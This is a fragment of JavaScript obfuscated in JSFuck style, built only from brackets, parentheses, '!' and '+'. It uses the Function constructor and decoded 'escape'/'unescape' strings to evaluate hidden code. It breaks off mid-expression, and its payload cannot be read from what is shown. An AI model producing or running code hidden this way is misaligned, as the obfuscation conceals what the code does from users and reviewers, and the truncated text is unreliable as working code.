(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+(!+[]+!+[]+!+[]+!+[]+!+[]+[!+[]+!+[]+!+[]+!+[]+!+[]])+[])+(+(!+[]+!+[]+[+!+[]]+[!+[]+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()(([]+[])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+[]])[+[]]+(!+[]+!+[]+!+[]+!+[]+!+[]+[+!+[]])+[])+(+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+